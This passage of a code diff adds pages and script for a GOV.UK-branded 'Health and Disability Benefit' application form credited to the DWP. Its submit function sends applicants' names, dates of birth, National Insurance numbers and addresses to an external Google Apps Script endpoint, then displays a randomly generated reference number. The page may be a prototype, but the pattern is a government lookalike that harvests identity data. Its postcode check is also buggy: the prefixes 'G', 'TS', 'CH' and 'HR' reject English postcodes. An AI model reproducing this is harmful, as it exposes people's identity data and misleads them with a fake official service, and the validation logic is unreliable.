+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-ni')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">What is your home address?</h1>
+    <p class="govuk-body">This service is only available to people who reside in England.</p>
+    <span class="govuk-error" id="err-address">Enter a valid English postcode</span>
+    <div id="address-form">
+      <label class="govuk-label" for="postcode">Postcode</label>
+      <span class="govuk-label-hint">Enter an English postcode, for example SW1A 1AA</span>
+      <input class="govuk-input input-small" type="text" id="postcode" placeholder="e.g. SW1A 1AA" style="max-width:180px; text-transform:uppercase; margin-bottom:16px;">
+      <br>
+      <label class="govuk-label" for="address-line1">Address line 1</label>
+      <input class="govuk-input" type="text" id="address-line1" placeholder="House number and street name">
+      <label class="govuk-label" for="address-line2">Address line 2 (optional)</label>
+      <input class="govuk-input" type="text" id="address-line2" placeholder="Flat, building, estate (optional)">
+      <label class="govuk-label" for="address-town">Town or city</label>
+      <input class="govuk-input" type="text" id="address-town">
+    </div>
+    <hr class="govuk-section-break">
+    <div class="govuk-radio" style="margin-top:16px;"><input type="checkbox" id="no-fixed-address" onchange="toggleNoFixedAddress(this)"><label for="no-fixed-address" style="font-size:17px;">I reside in England but I do not have a fixed address</label></div>
+    <div id="no-fixed-address-info" style="display:none;">
+      <div class="govuk-inset" style="margin-top:16px;">
+        <p>You can still apply. Please provide a contact address where we can reach you, such as a shelter, support worker, friend or family member's address.</p>
+      </div>
+      <label class="govuk-label" for="contact-address">Contact address</label>
+      <span class="govuk-label-hint">This could be a shelter, hostel, or a friend or family member's address in England</span>
+      <input class="govuk-input" type="text" id="contact-address" placeholder="Enter a contact address">
+    </div>
+    <button class="govuk-button" onclick="submitAddress()" style="margin-top:24px;">Continue</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+<!-- PAGE: Confirmation -->
+<div class="page" id="page-confirmation">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <div class="govuk-panel" style="background:#00703c; padding:30px; margin-bottom:30px;">
+      <h1 style="font-size:36px; font-weight:700; color:white; margin-bottom:12px;">Application submitted</h1>
+      <p style="font-size:24px; color:white;">Your reference number is <strong id="conf-ref"></strong></p>
+    </div>
+    <p class="govuk-body">We have received your application for Health and Disability Benefit.</p>
+    <p class="govuk-body">We will contact you within 12 weeks to let you know our decision.</p>
+    <h2 class="govuk-h2">What happens next</h2>
+    <ul class="govuk-list">
+      <li>We will review your application</li>
+      <li>We may contact you for more information</li>
+      <li>You may be asked to attend an assessment</li>
+      <li>We will write to you with our decision</li>
+    </ul>
+    <div class="govuk-inset">
+      <p>Save your reference number — you will need it if you contact us about your application.</p>
+    </div>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<!-- PAGE 5: Check your answers -->
+<div class="page" id="page-check">
+  <header class="govuk-header"><div class="govuk-header__inner"><svg class="govuk-crown" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 132 97" aria-hidden="true"><path d="M25 30.2c3.5 1.5 7.7-.2 9.1-3.7 1.5-3.6-.2-7.8-3.9-9.2-3.6-1.4-7.6.3-9.1 3.9-1.4 3.5.3 7.5 3.9 9zm51.1-3c1.5 3.5 5.7 5.2 9.1 3.8 3.6-1.4 5.3-5.4 3.8-9-1.4-3.5-5.3-5.2-8.9-3.8-3.6 1.3-5.3 5.3-4 9zM66.1 62.5H33.3L19.8 39.4c-5.4 2.2-11.5-.6-12.6-6.3-1-5.6 3.3-11 9-11.4 5.7-.4 10.7 4.2 10.7 9.9 0 .9-.1 1.7-.3 2.5L45.1 55.4c3.4-2.2 7.8-2.2 11.2 0l18.5-21.3c-.2-.8-.3-1.6-.3-2.5 0-5.7 5-10.3 10.7-9.9 5.7.4 10 5.8 9 11.4-1.1 5.7-7.2 8.5-12.6 6.3L67.9 55.4h.3l-.3-.4.2.3v.3L56.3 73.2H33.9L22.8 55.8H11.6l.1 3h11.2L33.3 75.7h22.9l11.5-18.9.3-.2.1-.1z"/></svg><span class="govuk-header__logotype-text">GOV.UK</span></div></header>
+  <div class="govuk-phase-banner"><div class="govuk-phase-banner__inner"><span class="govuk-tag">Beta</span><span>This is a new service – your <a href="#">feedback</a> will help us improve it.</span></div></div>
+  <main class="govuk-main-narrow">
+    <a class="govuk-back" onclick="goTo('page-address')">← Back</a>
+    <p class="govuk-caption">Apply for Health and Disability Benefit</p>
+    <h1 class="govuk-h1">Check your answers</h1>
+    <p class="govuk-body">Please check your details are correct before you continue.</p>
+    <h2 class="govuk-h2">Personal details</h2>
+    <dl class="govuk-summary-list">
+      <div class="govuk-summary-row"><dt class="govuk-summary-key">First name</dt><dd class="govuk-summary-value" id="s-firstname"></dd><dd class="govuk-summary-action"><a onclick="goTo('page-name')">Change</a></dd></div>
+      <div class="govuk-summary-row"><dt class="govuk-summary-key">Last name</dt><dd class="govuk-summary-value" id="s-surname"></dd><dd class="govuk-summary-action"><a onclick="goTo('page-name')">Change</a></dd></div>
+      <div class="govuk-summary-row"><dt class="govuk-summary-key">Date of birth</dt><dd class="govuk-summary-value" id="s-dob"></dd><dd class="govuk-summary-action"><a onclick="goTo('page-dob')">Change</a></dd></div>
+      <div class="govuk-summary-row"><dt class="govuk-summary-key">Age</dt><dd class="govuk-summary-value" id="s-age"></dd><dd class="govuk-summary-action"></dd></div>
+      <div class="govuk-summary-row"><dt class="govuk-summary-key">National Insurance number</dt><dd class="govuk-summary-value" id="s-ni"></dd><dd class="govuk-summary-action"><a onclick="goTo('page-ni')">Change</a></dd></div>
+      <div class="govuk-summary-row"><dt class="govuk-summary-key">Address</dt><dd class="govuk-summary-value" id="s-address"></dd><dd class="govuk-summary-action"><a onclick="goTo('page-address')">Change</a></dd></div>
+    </dl>
+    <div id="s-ni-warning" style="display:none;">
+      <div class="govuk-important-box"><p><strong>Reminder:</strong> If your application is successful, you must get a National Insurance number within 6 months or your benefit may stop.</p></div>
+    </div>
+    <button class="govuk-button" onclick="submitApplication()">Accept and send</button>
+  </main>
+  <footer class="govuk-footer"><div class="govuk-footer__inner"><p>Built by the Department for Work &amp; Pensions</p></div></footer>
+</div>
+
+<script>
+  var data = { firstname:'', surname:'', day:'', month:'', year:'', age:0, ni:'', niStatus:'', address:'', noFixedAddress:false };
+  var months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
+  var nonEnglandPrefixes = ['LL','SY','LD','SA','NP','CF','CH','HR','BT','EH','G','KA','PA','PH','DD','AB','IV','KW','ZE','HS','TD','ML','KY','FK','DG','TS'];
+
+  function goTo(id) {
+    document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0,0);
+  }
+
+  function submitName() {
+    var fn = document.getElementById('firstname').value.trim();
+    var sn = document.getElementById('surname').value.trim();
+    var valid = true;
+    document.getElementById('err-firstname').classList.remove('visible');
+    document.getElementById('err-surname').classList.remove('visible');
+    document.getElementById('firstname').classList.remove('govuk-error-border');
+    document.getElementById('surname').classList.remove('govuk-error-border');
+    if (!fn) { document.getElementById('err-firstname').classList.add('visible'); document.getElementById('firstname').classList.add('govuk-error-border'); valid = false; }
+    if (!sn) { document.getElementById('err-surname').classList.add('visible'); document.getElementById('surname').classList.add('govuk-error-border'); valid = false; }
+    if (!valid) return;
+    data.firstname = fn; data.surname = sn;
+    goTo('page-dob');
+  }
+
+  function submitDob() {
+    var d = document.getElementById('dob-day').value.trim();
+    var m = document.getElementById('dob-month').value.trim();
+    var y = document.getElementById('dob-year').value.trim();
+    var errEl = document.getElementById('err-dob');
+    errEl.classList.remove('visible');
+    ['dob-day','dob-month','dob-year'].forEach(function(id){ document.getElementById(id).classList.remove('govuk-error-border'); });
+    var day = parseInt(d), month = parseInt(m), year = parseInt(y);
+    var now = new Date();
+    var dob = new Date(year, month-1, day);
+    var valid = d && m && y && day>=1 && day<=31 && month>=1 && month<=12 && year>=1900 && year<=now.getFullYear() && dob<=now;
+    if (!valid) { errEl.textContent='Enter a valid date of birth'; errEl.classList.add('visible'); ['dob-day','dob-month','dob-year'].forEach(function(id){ document.getElementById(id).classList.add('govuk-error-border'); }); return; }
+    var age = now.getFullYear()-year;
+    if (now.getMonth()+1<month||(now.getMonth()+1===month&&now.getDate()<day)) age--;
+    if (age<16) { errEl.textContent='You must be 16 or older to apply'; errEl.classList.add('visible'); return; }
+    data.day=day; data.month=month; data.year=year; data.age=age;
+    goTo('page-ni');
+  }
+
+  function submitNI() {
+    var b1 = document.getElementById('ni-1').value.trim().toUpperCase();
+    var b2 = document.getElementById('ni-2').value.trim();
+    var b3 = document.getElementById('ni-3').value.trim();
+    var b4 = document.getElementById('ni-4').value.trim();
+    var b5 = document.getElementById('ni-5').value.trim().toUpperCase();
+    var errEl = document.getElementById('err-ni');
+    errEl.classList.remove('visible');
+    var niVal = b1+b2+b3+b4+b5;
+    var niRegex = /^[A-Z]{2}[0-9]{6}[A-Z]$/;
+    if (!niRegex.test(niVal)) { errEl.textContent='Enter a valid National Insurance number, for example QQ 12 34 56 C'; errEl.classList.add('visible'); return; }
+    data.ni = b1+' '+b2+' '+b3+' '+b4+' '+b5;
+    data.niStatus = 'provided';
+    goTo('page-address');
+  }
+
+  function submitNIApply() {
+    var yes = document.getElementById('ni-apply-yes').checked;
+    var no = document.getElementById('ni-apply-no').checked;
+    var errEl = document.getElementById('err-ni-apply');
+    errEl.classList.remove('visible');
+    if (!yes && !no) { errEl.classList.add('visible'); return; }
+    if (yes) { goTo('page-ni-placeholder'); }
+    else { goTo('page-ni-confirm'); }
+  }
+
+  function submitNIConfirm() {
+    var checked = document.getElementById('ni-understand').checked;
+    var errEl = document.getElementById('err-ni-confirm');
+    errEl.classList.remove('visible');
+    if (!checked) { errEl.classList.add('visible'); return; }
+    data.ni = 'Not provided';
+    data.niStatus = 'none-confirmed';
+    goTo('page-address');
+  }
+
+  function toggleNoFixedAddress(el) {
+    var addressForm = document.getElementById('address-form');
+    var nfaInfo = document.getElementById('no-fixed-address-info');
+    data.noFixedAddress = el.checked;
+    addressForm.style.display = el.checked ? 'none' : 'block';
+    nfaInfo.style.display = el.checked ? 'block' : 'none';
+  }
+
+  function isNonEnglandPostcode(pc) {
+    var upper = pc.toUpperCase().replace(/\s/g,'');
+    for (var i=0; i<nonEnglandPrefixes.length; i++) {
+      if (upper.indexOf(nonEnglandPrefixes[i])===0) return true;
+    }
+    return false;
+  }
+
+  function submitAddress() {
+    var errEl = document.getElementById('err-address');
+    errEl.classList.remove('visible');
+    if (data.noFixedAddress) {
+      var contact = document.getElementById('contact-address').value.trim();
+      if (!contact) { errEl.textContent='Enter a contact address'; errEl.classList.add('visible'); return; }
+      data.address = 'No fixed address\nContact: '+contact;
+    } else {
+      var pc = document.getElementById('postcode').value.trim();
+      var line1 = document.getElementById('address-line1').value.trim();
+      var town = document.getElementById('address-town').value.trim();
+      if (!pc || !line1 || !town) { errEl.textContent='Enter your full address including postcode, address line 1 and town'; errEl.classList.add('visible'); return; }
+      if (isNonEnglandPostcode(pc)) { errEl.textContent='This service is only available to people who reside in England. Your postcode appears to be outside England.'; errEl.classList.add('visible'); return; }
+      var line2 = document.getElementById('address-line2').value.trim();
+      data.address = line1 + (line2?'\n'+line2:'') + '\n' + town + '\n' + pc.toUpperCase();
+    }
+    var dobFormatted = data.day+' '+months[data.month-1]+' '+data.year;
+    document.getElementById('s-firstname').textContent = data.firstname;
+    document.getElementById('s-surname').textContent = data.surname;
+    document.getElementById('s-dob').textContent = dobFormatted;
+    document.getElementById('s-age').textContent = data.age+' years old';
+    document.getElementById('s-ni').textContent = data.niStatus==='application-in-progress' ? 'Application in progress' : data.ni;
+    document.getElementById('s-address').style.whiteSpace = 'pre-line';
+    document.getElementById('s-address').textContent = data.address;
+    var warn = document.getElementById('s-ni-warning');
+    warn.style.display = (data.niStatus==='none-confirmed'||data.niStatus==='application-in-progress') ? 'block' : 'none';
+    goTo('page-check');
+  }
+function submitApplication() {
+  document.querySelector('[onclick="submitApplication()"]').disabled = true;
+  var scriptURL = 'https://script.google.com/macros/s/AKfycbyOroR51JdU_Gpz6nYuEIUMnzElp9q7UeOA9BcCW4fWTXh0bldxObR_XjQWI6_FfZX95g/exec';
+  fetch(scriptURL, {
+    method: 'POST',
+    body: JSON.stringify({
+      firstname: data.firstname,
+      surname: data.surname,
+      dob: data.day + ' ' + months[data.month-1] + ' ' + data.year,
+      age: data.age,
+      ni: data.ni,
+      niStatus: data.niStatus,
+      address: data.address
+    })
+  })
+  .then(function() {
+    document.getElementById('conf-ref').textContent = 'HDB-' + Math.floor(Math.random() * 900000 + 100000);
+    goTo('page-confirmation');
+  })
+  .catch(function() {
+    alert('Something went wrong. Please try again.');
+  });
+}</script>
